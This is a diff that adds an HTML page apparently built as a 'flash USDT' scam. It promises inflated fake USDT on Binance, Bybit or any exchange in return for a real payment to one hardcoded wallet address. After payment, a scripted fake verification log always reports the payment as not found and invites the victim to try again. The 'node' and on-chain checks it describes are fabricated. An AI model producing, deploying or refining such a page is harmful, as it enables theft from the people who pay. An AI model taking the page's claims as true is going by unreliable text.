@@ -1,0 +1,426 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover" />
+<title>FLASH $ — Generator | Binance · Bybit · Master</title>
+<meta name="description" content="FLASH $ generator — instant flash USDT for Binance, Bybit and Master Flash." />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+  :root{
+    --bg:#05080a; --card:#0b1014; --border:#1b2a23;
+    --neon:#39ff88; --neon-dim:#1f7a45; --danger:#ff4747;
+    --muted:#7a8a82; --fg:#d8f5e3;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0;background:var(--bg);color:var(--fg);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:100vh;overflow-x:hidden}
+  body::before{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:1;
+    background:repeating-linear-gradient(0deg,rgba(57,255,136,.04) 0 1px,transparent 1px 3px);
+  }
+  canvas#matrix{position:fixed;inset:0;z-index:0;opacity:.35}
+  header,main,footer{position:relative;z-index:2}
+  header{padding:14px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;backdrop-filter:blur(6px)}
+  .logo{display:flex;align-items:center;gap:10px}
+  .logo .badge{width:36px;height:36px;border:1px solid var(--neon);border-radius:6px;display:grid;place-items:center;background:var(--card);box-shadow:0 0 16px rgba(57,255,136,.35)}
+  .logo h1{margin:0;font-size:16px;letter-spacing:.25em;color:var(--neon);text-shadow:0 0 8px rgba(57,255,136,.6)}
+  .logo small{display:block;color:var(--muted);font-size:10px;margin-top:-2px}
+  .status{display:flex;gap:10px;font-size:11px;color:var(--muted)}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--neon);box-shadow:0 0 10px var(--neon);display:inline-block;margin-right:6px;animation:pulse 1.6s infinite}
+  @keyframes pulse{50%{opacity:.4}}
+  main{max-width:980px;margin:0 auto;padding:24px 16px 60px}
+  .stepper{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:24px;font-size:11px}
+  .step{padding:6px 10px;border:1px solid var(--border);border-radius:4px;color:var(--muted);letter-spacing:.15em}
+  .step.active{border-color:var(--neon);color:var(--neon);box-shadow:0 0 12px rgba(57,255,136,.25)}
+  h2{font-size:clamp(22px,5vw,38px);text-align:center;color:var(--neon);text-shadow:0 0 10px rgba(57,255,136,.5);margin:0 0 8px;letter-spacing:.02em}
+  .lead{text-align:center;color:var(--muted);font-size:13px;max-width:520px;margin:0 auto 28px}
+  .pre{display:block;text-align:center;color:var(--neon-dim);font-size:11px;letter-spacing:.25em;margin-bottom:6px}
+  .grid{display:grid;gap:14px;grid-template-columns:1fr}
+  @media(min-width:720px){.grid{grid-template-columns:repeat(3,1fr)}}
+  .card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;text-align:left;color:inherit;font:inherit;width:100%}
+  .card:hover,.card:active{border-color:var(--neon);transform:translateY(-2px);box-shadow:0 8px 30px rgba(57,255,136,.15)}
+  .card .icon{width:fit-content;height:44px;border-radius:6px;border:1px solid var(--neon);display:flex;align-items:center;justify-content:center;padding:6px 12px;background:#0a1410;color:var(--neon);font-size:18px;margin-bottom:12px;overflow:hidden}
+  .card h3{margin:0 0 6px;color:var(--neon);font-size:17px}
+  .card p{margin:0 0 12px;color:var(--muted);font-size:12px;line-height:1.5}
+  .card .tag{position:absolute;top:14px;right:14px;font-size:10px;color:var(--neon-dim);letter-spacing:.2em}
+  .card .cta{color:var(--neon);font-size:12px;letter-spacing:.15em}
+  .badge-prem{display:inline-block;margin-top:10px;font-size:10px;padding:2px 6px;border:1px solid var(--neon);border-radius:3px;color:var(--neon)}
+  .pack{position:relative}
+  .pack.popular{border-color:var(--neon);box-shadow:0 0 20px rgba(57,255,136,.25)}
+  .pack .pop{position:absolute;top:-10px;right:14px;background:var(--neon);color:#001a08;font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px}
+  .price{font-size:34px;font-weight:700;color:var(--neon);text-shadow:0 0 8px rgba(57,255,136,.5)}
+  .receive{font-size:22px;color:#fff;font-weight:700}
+  .sep{border-top:1px solid var(--border);margin:12px 0;padding-top:10px}
+  .feat{font-size:12px;color:var(--muted);margin:0;padding:0;list-style:none}
+  .feat li{padding:3px 0}
+  .feat li::before{content:"✓ ";color:var(--neon)}
+  .exec{margin-top:14px;text-align:center;padding:8px;border:1px solid var(--neon);color:var(--neon);font-weight:700;border-radius:6px;letter-spacing:.15em;font-size:13px}
+  .back{background:none;border:none;color:var(--muted);font:inherit;font-size:12px;cursor:pointer;margin-bottom:14px;padding:0}
+  .back:hover{color:var(--neon)}
+  .session{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+  .session-head{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(20,40,30,.3)}
+  .session-head h2{font-size:16px;text-align:left;text-shadow:none;margin:0}
+  .timer{font-size:22px;font-weight:700;color:var(--neon);text-align:right}
+  .timer.low{color:var(--danger)}
+  .session-body{padding:16px;display:grid;gap:20px}
+  @media(min-width:720px){.session-body{grid-template-columns:1fr 1fr}}
+  .info{background:#070b0e;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:12px}
+  .info .row{display:flex;justify-content:space-between;padding:3px 0;color:var(--muted)}
+  .info .row b{color:var(--neon);font-weight:700}
+  .qrwrap{margin-top:14px;background:rgba(20,40,30,.3);border:1px solid var(--border);border-radius:6px;padding:14px;text-align:center}
+  .qrwrap canvas{background:#fff;padding:8px;border-radius:4px;max-width:180px;width:100%;height:auto !important}
+  .addr{margin-top:10px;background:#070b0e;border:1px solid var(--border);border-radius:4px;padding:10px 12px;display:flex;justify-content:space-between;gap:8px;align-items:center;font-size:10px;cursor:pointer;word-break:break-all;transition:all 0.2s;user-select:none;}.addr:hover{border-color:var(--neon);background:#0a1a10;}
+  .addr code{color:var(--fg);overflow:hidden;text-overflow:ellipsis}
+  .warn{margin-top:10px;font-size:11px;color:var(--muted);display:flex;gap:8px;align-items:flex-start}
+  .warn b{color:var(--neon)}
+  form label{display:block;margin-bottom:14px}
+  form span{font-size:11px;color:var(--muted);letter-spacing:.15em;display:block;margin-bottom:4px}
+  form input{width:100%;background:#070b0e;border:1px solid var(--border);border-radius:4px;padding:10px;color:var(--fg);font:inherit;font-size:13px}
+  form input:focus{outline:none;border-color:var(--neon)}
+  form input:disabled{opacity:.5}
+  .btn{width:100%;padding:13px;border-radius:6px;border:none;font:inherit;font-weight:700;letter-spacing:.15em;cursor:pointer;font-size:14px}
+  .btn-primary{background:var(--neon);color:#001a08;box-shadow:0 0 18px rgba(57,255,136,.5)}
+  .btn-primary:disabled{opacity:.4;box-shadow:none}
+  .term-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;font-size:13px}
+  .term-head .lbl{color:var(--neon);font-weight:700;letter-spacing:.15em}
+  .term-head .lbl.fail{color:var(--danger)}
+  .term-head .lbl .dot{background:currentColor;box-shadow:0 0 10px currentColor}
+  .terminal{background:rgba(0,0,0,.7);border:1px solid var(--border);border-radius:6px;padding:14px;height:280px;overflow-y:auto;font-size:12px;line-height:1.6}
+  .terminal p{margin:0}
+  .t-dim{color:var(--neon-dim)} .t-neon{color:var(--neon)} .t-danger{color:var(--danger)}
+  .cursor{display:inline-block;animation:blink 1s infinite}
+  @keyframes blink{50%{opacity:0}}
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:20px;z-index:50}
+  .modal.open{display:flex}
+  .modal-card{max-width:420px;width:100%;background:var(--card);border:2px solid var(--danger);border-radius:10px;padding:22px;box-shadow:0 0 40px rgba(255,71,71,.4)}
+  .modal-card h3{margin:0 0 12px;color:var(--danger);font-size:20px;letter-spacing:.15em;display:flex;align-items:center;gap:10px}
+  .modal-card p{font-size:13px;color:var(--muted);margin:0 0 8px}
+  .modal-card ul{font-size:12px;color:var(--muted);padding-left:18px;margin:0 0 18px}
+  .modal-actions{display:flex;gap:10px}
+  .modal-actions button{flex:1;padding:10px;border-radius:4px;font:inherit;font-weight:700;letter-spacing:.15em;cursor:pointer;font-size:12px;border:1px solid var(--border);background:transparent;color:var(--fg)}
+  .modal-actions button:hover{border-color:var(--neon);color:var(--neon)}
+  .modal-actions .danger{background:var(--danger);color:#fff;border-color:var(--danger)}
+  .hidden{display:none !important}
+  .anim{animation:slide .35s ease-out}
+  @keyframes slide{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+  footer{padding:24px 16px;text-align:center;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:30px}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+
+<header>
+  <div class="logo">
+    <div class="badge">⚡</div>
+    <div><h1>FLASH $</h1><small>v2.4 // mainnet</small></div>
+  </div>
+  <div class="status"><span><span class="dot"></span>NODE_ONLINE</span></div>
+</header>
+
+<main>
+  <div class="stepper" id="stepper">
+    <div class="step" data-s="platform">01_PLATFORM</div>
+    <div class="step" data-s="package">02_PACKAGE</div>
+    <div class="step" data-s="payment">03_EXECUTE</div>
+  </div>
+
+  <!-- STEP 1 -->
+  <section id="view-platform" class="anim">
+    <p class="pre">&gt; SELECT_PROTOCOL</p>
+    <h2>GENERATE FLASH USDT</h2>
+    <p class="lead">Choose your target exchange. Each protocol is optimized for its native chain. Funds appear instantly after on-chain confirmation.</p>
+    <div class="grid" id="platforms"></div>
+  </section>
+
+  <!-- STEP 2 -->
+  <section id="view-package" class="anim hidden">
+    <button class="back" data-back="platform">‹ back</button>
+    <p class="pre" id="pkgTag">&gt; TAG</p>
+    <h2 id="pkgTitle">SELECT PACK</h2>
+    <p class="lead">Choose a flash package. Higher tiers carry better priority routing.</p>
+    <div class="grid" id="packages"></div>
+  </section>
+
+  <!-- STEP 3 -->
+  <section id="view-payment" class="anim hidden">
+    <button class="back" data-back="package">‹ back</button>
+    <div class="session">
+      <div class="session-head">
+        <div>
+          <p class="pre" style="text-align:left;margin:0" id="sesTag">TAG</p>
+          <h2>PAYMENT_SESSION</h2>
+        </div>
+        <div>
+          <div style="font-size:10px;color:var(--muted);text-align:right">EXPIRES IN</div>
+          <div class="timer" id="timer">03:00</div>
+        </div>
+      </div>
+      <div class="session-body" id="payBody">
+        <div>
+          <div class="info">
+            <div class="row"><span>PROTOCOL</span><b id="iProto"></b></div>
+            <div class="row"><span>PACK</span><b id="iPack"></b></div>
+            <div class="row"><span>YOU PAY</span><b id="iPay"></b></div>
+            <div class="row"><span>YOU RECEIVE</span><b id="iRecv"></b></div>
+          </div>
+          <div class="qrwrap">
+            <div id="qr"></div>
+            <div style="font-size:10px;color:var(--muted);letter-spacing:.2em;margin-top:8px">USDT (BEP20 / TRC20)</div>
+            <div class="addr" id="addrBox"><code id="addr"></code><span id="copyIcn">⧉</span></div>
+          </div>
+          <div class="warn">⚠ Send exact <b id="warnAmt"></b> to the address above. Underpayment will void the session.</div>
+        </div>
+        <form id="payForm">
+          <p class="pre" style="text-align:left">&gt; CONFIRM_PAYMENT</p>
+          <label><span>TRANSACTION HASH</span><input id="txHash" placeholder="0x..." required disabled></label>
+          <label><span id="uidLabel">EXCHANGE UID</span><input id="exId" placeholder="Your account ID" required disabled></label>
+          <button type="button" id="paidBtn" class="btn btn-primary">I HAVE PAID →</button>
+          <button type="submit" id="submitBtn" class="btn btn-primary hidden">SUBMIT &amp; PROCESS →</button>
+          <p style="font-size:10px;color:var(--muted);text-align:center;margin-top:10px">After submit the node verifies on-chain.</p>
+        </form>
+      </div>
+      <!-- processing view -->
+      <div class="session-body hidden" id="procBody" style="grid-template-columns:1fr">
+        <div>
+          <div class="term-head">
+            <div class="lbl" id="procLbl"><span class="dot"></span> VERIFYING_PAYMENT</div>
+            <div style="font-size:12px;color:var(--muted)">scan window <span id="procT" style="color:var(--neon)">00:30</span></div>
+          </div>
+          <div class="terminal" id="terminal"></div>
+          <p style="font-size:10px;color:var(--muted);text-align:center;margin-top:10px" id="procFoot">Do not close this window. The node is scanning the chain.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <p>&gt; FLASH $ // proprietary protocol — unauthorized use prohibited</p>
+  <p style="opacity:.6">© <span id="yr"></span> FLASH $ TOKEN</p>
+</footer>
+
+<div class="modal" id="failModal">
+  <div class="modal-card">
+    <h3>⚠ PAYMENT FAILED</h3>
+    <p>The node could not verify your transaction on-chain. No matching payment was detected for the submitted hash and UID.</p>
+    <ul>
+      <li>Check that you sent the exact amount</li>
+      <li>Confirm the transaction hash is correct</li>
+      <li>Verify your exchange UID</li>
+    </ul>
+    <div class="modal-actions">
+      <button id="mMain">MAIN PAGE</button>
+      <button class="danger" id="mRetry">TRY AGAIN →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const ADDR = "0x91Cc7f72821FFFb6f205e95AC7cf572Fe3Bab92a";
+const BINANCE_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 126.61 126.61" width="38" height="38"><path fill="#F3BA2F" d="M38.73 53.2L63.3 28.64l24.59 24.59 14.3-14.3L63.3 0 24.43 38.9zM0 63.31l14.3-14.31 14.31 14.31-14.31 14.3zm38.73 10.1L63.3 97.97l24.59-24.58 14.31 14.29-38.9 38.93-38.9-38.9 -.02-.02zm75.17-24.41l14.3 14.3-14.3 14.32-14.31-14.31zM73.93 63.3l.01.01-10.64 10.63-10.62-10.62-.02-.02.02-.01.26-.26 1.15-1.15 9.21-9.21 10.65 10.65z"/></svg>`;
+const BYBIT_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 36" width="80" height="28"><style>@import url('https://fonts.googleapis.com/css2?family=Exo+2:wght@800&amp;display=swap');</style><text y="28" font-family="Arial Black, sans-serif" font-weight="900" font-size="32" fill="white" letter-spacing="-1">BY</text><rect x="68" y="3" width="5" height="28" fill="#F0B90B" rx="1"/><text x="73" y="28" font-family="Arial Black, sans-serif" font-weight="900" font-size="32" fill="white" letter-spacing="-1">IT</text></svg>`;
+const MASTER_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" width="36" height="36"><polygon points="20,2 38,11 38,29 20,38 2,29 2,11" fill="none" stroke="#F0B90B" stroke-width="2.5"/><text x="20" y="26" text-anchor="middle" font-family="Arial Black,sans-serif" font-weight="900" font-size="15" fill="#F0B90B">M</text></svg>`;
+const PLAT = {
+  binance:{name:"Binance Flash",tag:"BNB_FLASH_v2.4",icon:BINANCE_LOGO,desc:"Flash USDT to Binance wallets. BEP20 backbone.",mult:1,uid:"Binance UID"},
+  bybit  :{name:"Bybit Flash",  tag:"BYBIT_FLASH_v2.4",icon:BYBIT_LOGO,desc:"Direct injection into Bybit accounts. High speed routing.",mult:1,uid:"Bybit UID"},
+  master :{name:"Master Flash", tag:"MASTER_FLASH_ALL_IN_ONE",icon:MASTER_LOGO,desc:"Universal flash — works across every exchange. Premium tier.",mult:1.5,uid:"Exchange UID"},
+};
+const BASE=[{id:"starter",p:60,f:400,l:"STARTER"},{id:"pro",p:150,f:1200,l:"PRO"},{id:"elite",p:300,f:2500,l:"ELITE"}];
+function packs(pl){const m=PLAT[pl].mult;return BASE.map(b=>({...b,p:Math.round(b.p*m)}))}
+
+let state={step:"platform",pl:null,pk:null};
+const $=s=>document.querySelector(s);
+document.getElementById("yr").textContent=new Date().getFullYear();
+
+function setStep(s){
+  state.step=s;
+  ["platform","package","payment"].forEach(k=>$("#view-"+k).classList.toggle("hidden",k!==s));
+  document.querySelectorAll("#stepper .step").forEach((el,i)=>{
+    const order=["platform","package","payment"];
+    el.classList.toggle("active",order.indexOf(s)>=i);
+  });
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+// Platforms
+const platHtml=Object.entries(PLAT).map(([k,v])=>`
+  <button class="card" data-pl="${k}">
+    <span class="tag">${v.tag.split("_")[0]}_NODE</span>
+    <div class="icon">${v.icon}</div>
+    <h3>${v.name.toUpperCase()}</h3>
+    <p>${v.desc}</p>
+    <div class="cta">INITIALIZE →</div>
+    ${k==="master"?'<span class="badge-prem">PREMIUM × 1.5</span>':''}
+  </button>`).join("");
+$("#platforms").innerHTML=platHtml;
+$("#platforms").addEventListener("click",e=>{
+  const b=e.target.closest("[data-pl]");if(!b)return;
+  state.pl=b.dataset.pl;renderPacks();setStep("package");
+});
+
+// Packages
+function renderPacks(){
+  const m=PLAT[state.pl];
+  $("#pkgTag").textContent="> "+m.tag;
+  $("#pkgTitle").textContent=m.name+" // SELECT PACK";
+  const pkgList=packs(state.pl);
+  $("#packages").innerHTML=pkgList.map((p,i)=>`
+    <button class="card pack ${i===1?'popular':''}" data-pk="${p.id}" onclick="choosePack('${p.id}')">
+      ${i===1?'<span class="pop">MOST USED</span>':''}
+      <p style="font-size:11px;color:var(--neon-dim);letter-spacing:.2em;margin:0 0 4px">${p.l}_PACK</p>
+      <div><span class="price">$${p.p}</span> <span style="font-size:11px;color:var(--muted)">USDT in</span></div>
+      <div class="sep">
+        <p style="font-size:11px;color:var(--muted);margin:0 0 4px">YOU RECEIVE</p>
+        <p class="receive" style="margin:0">$${p.f.toLocaleString()} <span style="font-size:11px;color:var(--neon)">FLASH</span></p>
+      </div>
+      <ul class="feat"><li>Instant routing</li><li>24h flash window</li><li>Encrypted handshake</li></ul>
+      <div class="exec">EXECUTE →</div>
+    </button>`).join("");
+}
+function choosePack(pkId){
+  state.pk=pkId;startPayment();setStep("payment");
+}
+
+// Back
+document.querySelectorAll("[data-back]").forEach(b=>b.addEventListener("click",()=>{
+  if(b.dataset.back==="platform"){setStep("platform")}
+  else{stopPayTimer();setStep("package")}
+}));
+
+// Payment
+let payT=null,payLeft=180,procT=null,procLeft=30,logT=null;
+function fmt(s){return String(Math.floor(s/60)).padStart(2,"0")+":"+String(s%60).padStart(2,"0")}
+function stopPayTimer(){clearInterval(payT);payT=null;clearInterval(procT);procT=null;clearInterval(logT);logT=null}
+function resetAll(){stopPayTimer();state={step:"platform",pl:null,pk:null};$("#failModal").classList.remove("open");setStep("platform");}
+
+function startPayment(){
+  const m=PLAT[state.pl];const p=packs(state.pl).find(x=>x.id===state.pk);
+  $("#sesTag").textContent=m.tag+" // "+p.l;
+  $("#iProto").textContent=m.name; $("#iPack").textContent=p.l;
+  $("#iPay").textContent="$"+p.p+" USDT"; $("#iRecv").textContent="$"+p.f+" FLASH";
+  $("#warnAmt").textContent="$"+p.p+" USDT";
+  $("#uidLabel").textContent=m.uid.toUpperCase();
+  $("#addr").textContent=ADDR;
+  (function(){
+    var el=document.getElementById("qr");
+    el.innerHTML="";
+    new QRCode(el,{text:ADDR,width:180,height:180,colorDark:"#000000",colorLight:"#ffffff",correctLevel:QRCode.CorrectLevel.M});
+    setTimeout(function(){
+      var canvas=el.querySelector("canvas");
+      var img=el.querySelector("img");
+      if(img) img.style.display="none";
+      if(canvas){canvas.style.cssText="max-width:180px;width:100% !important;height:auto !important;border-radius:4px;padding:8px;background:#fff;display:block;margin:0 auto;";}
+    },100);
+  })();
+  // reset form/views
+  $("#payBody").classList.remove("hidden"); $("#procBody").classList.add("hidden");
+  $("#paidBtn").classList.remove("hidden"); $("#submitBtn").classList.add("hidden");
+  $("#txHash").value=""; $("#exId").value="";
+  $("#txHash").disabled=true; $("#exId").disabled=true;
+  $("#failModal").classList.remove("open");
+  payLeft=180; $("#timer").textContent=fmt(payLeft); $("#timer").classList.remove("low");
+  payT=setInterval(()=>{
+    payLeft--; $("#timer").textContent=fmt(payLeft);
+    if(payLeft<30)$("#timer").classList.add("low");
+    if(payLeft<=0){resetAll()}
+  },1000);
+}
+
+$("#addrBox").addEventListener("click",function(){
+  try{
+    if(navigator.clipboard&&window.isSecureContext){
+      navigator.clipboard.writeText(ADDR);
+    } else {
+      var ta=document.createElement("textarea");
+      ta.value=ADDR;ta.style.cssText="position:fixed;left:-9999px;top:-9999px";
+      document.body.appendChild(ta);ta.focus();ta.select();
+      document.execCommand("copy");document.body.removeChild(ta);
+    }
+    $("#copyIcn").textContent="✓ COPIED!";
+    $("#addrBox").style.borderColor="var(--neon)";
+    $("#addrBox").style.boxShadow="0 0 12px rgba(57,255,136,0.4)";
+    setTimeout(function(){
+      $("#copyIcn").textContent="⧉";
+      $("#addrBox").style.borderColor="";
+      $("#addrBox").style.boxShadow="";
+    },2000);
+  }catch(e){}
+});
+$("#paidBtn").addEventListener("click",()=>{
+  $("#paidBtn").classList.add("hidden"); $("#submitBtn").classList.remove("hidden");
+  $("#txHash").disabled=false; $("#exId").disabled=false; $("#txHash").focus();
+});
+$("#payForm").addEventListener("submit",e=>{
+  e.preventDefault();
+  if(!$("#txHash").value||!$("#exId").value)return;
+  startProcessing();
+});
+
+function startProcessing(){
+  clearInterval(payT);
+  $("#payBody").classList.add("hidden"); $("#procBody").classList.remove("hidden");
+  procLeft=30; $("#procT").textContent=fmt(procLeft);
+  procT=setInterval(()=>{procLeft--;$("#procT").textContent=fmt(procLeft);if(procLeft<=0){clearInterval(procT)}},1000);
+
+  const term=$("#terminal");term.innerHTML="";
+  const seq=[
+    ["$ flash --verify-payment --strict","neon"],
+    ["[init] opening secure socket → node-04.flash","dim"],
+    ["[handshake] HMAC-SHA256 ........ OK","dim"],
+    ["[scan] mempool sweep started ...","dim"],
+    ["$ finding your payment ...","neon"],
+    ["[scan] querying BEP20 explorer ...","dim"],
+    ["[scan] querying TRC20 explorer ...","dim"],
+    ["$ finding your payment ...","neon"],
+    ["[match] cross-checking tx hash ...","dim"],
+    ["[match] checking exchange UID binding ...","dim"],
+    ["[verify] awaiting confirmations ...","dim"],
+    ["[verify] timeout after 18s","dim"],
+    ["[ERROR] no matching transaction on-chain","danger"],
+    ["[ERROR] PAYMENT NOT DETECTED","danger"],
+    ["[ABORT] session terminated by node","danger"],
+  ];
+  let i=0;
+  const cursor=document.createElement("p");cursor.className="t-neon";cursor.innerHTML='<span class="cursor">█</span>';term.appendChild(cursor);
+  logT=setInterval(()=>{
+    if(i<seq.length){
+      const [t,c]=seq[i++];
+      const p=document.createElement("p");p.className="t-"+c;
+      p.innerHTML='<span style="color:var(--'+(c==="danger"?"danger":"neon")+')">&gt;</span> '+t;
+      term.insertBefore(p,cursor);term.scrollTop=term.scrollHeight;
+    }else{
+      clearInterval(logT);cursor.remove();
+      $("#procLbl").classList.add("fail");
+      $("#procLbl").innerHTML='<span class="dot"></span> PAYMENT_FAILED';
+      $("#procFoot").textContent="Node rejected the payment. Returning to main interface...";
+      $("#failModal").classList.add("open");
+    }
+  },1700);
+}
+
+$("#mMain").addEventListener("click",function(){resetAll();});
+$("#mRetry").addEventListener("click",function(){resetAll();});
+// fallback: close modal on backdrop click
+$("#failModal").addEventListener("click",function(e){if(e.target===this)resetAll();});
+
+// Matrix rain
+(function(){
+  const c=document.getElementById("matrix"),x=c.getContext("2d");
+  let w,h,cols,drops;const chars="01ABCDEF$USDTFLASH₿Ξ◊◈".split("");
+  function R(){w=c.width=innerWidth;h=c.height=innerHeight;cols=Math.floor(w/14);drops=Array(cols).fill(1)}
+  R();addEventListener("resize",R);
+  setInterval(()=>{
+    x.fillStyle="rgba(5,8,10,.08)";x.fillRect(0,0,w,h);
+    x.fillStyle="#39ff88";x.font="13px monospace";
+    drops.forEach((y,i)=>{
+      const t=chars[Math.floor(Math.random()*chars.length)];
+      x.fillText(t,i*14,y*14);
+      if(y*14>h&&Math.random()>.975)drops[i]=0;drops[i]++;
+    });
+  },60);
+})();
+
+setStep("platform");
+</script>
+</body>
+</html>
